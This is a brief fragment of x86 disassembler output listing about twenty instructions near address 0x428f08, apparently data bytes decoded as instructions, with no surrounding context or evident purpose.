  428f08:	jle    0x428e96
  428f0a:	add    al,BYTE PTR [eax]
  428f0c:	xchg   esp,eax
  428f0d:	mov    WORD PTR [edx],es
  428f0f:	add    BYTE PTR [esp+ecx*4-0x734bfffe],ah
  428f16:	add    al,BYTE PTR [eax]
  428f18:	les    ecx,FWORD PTR [edx+eax*1+0x28cd200]
  428f1f:	add    dl,ch
  428f21:	mov    WORD PTR [edx],es
  428f23:	add    ah,dh
  428f25:	mov    WORD PTR [edx],es
  428f27:	add    BYTE PTR [eax],al
  428f29:	lea    eax,[edx]
  428f2b:	add    BYTE PTR [esi],cl
  428f2d:	lea    eax,[edx]
  428f2f:	add    BYTE PTR [eax],al
  428f31:	add    BYTE PTR [eax],al
	...
